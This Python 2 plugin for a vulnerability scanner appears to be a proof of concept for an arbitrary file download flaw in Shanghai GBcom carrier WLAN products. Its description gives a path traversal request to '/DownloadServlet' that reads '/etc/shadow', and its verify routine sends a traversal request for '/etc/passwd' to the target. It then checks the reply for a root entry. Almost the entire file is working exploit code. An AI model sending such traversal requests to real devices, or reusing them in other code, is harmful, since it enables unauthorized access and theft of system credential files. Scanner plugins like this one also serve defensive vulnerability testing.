# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re, urlparse

class Vuln(ABVuln):
    vuln_id = 'GBcom_0001'  # 平台漏洞编号，留空
    name = '上海寰创运营商WLAN产品任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-06-17'  # 漏洞公布时间
    desc = '''
        上海寰创运营商WLAN产品 /DownloadServlet?fileName=../../etc/shadow 任意文件下载（可直接获取管理员账号密码等）。
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '上海寰创'  # 漏洞应用名称
    product_version = '上海寰创运营商WLAN产品'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'f87a6b1d-7252-4f7e-b490-a11596a0cdeb'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            #refer: http://www.wooyun.org/bugs/wooyun-2010-0121010
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/DownloadServlet?fileName=../../etc/passwd'
            code, head, res, err, _ = hh.http(url)

            if code == 200 and 'root:' in res:
                #security_hole('Arbitrarilly file download: '+url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
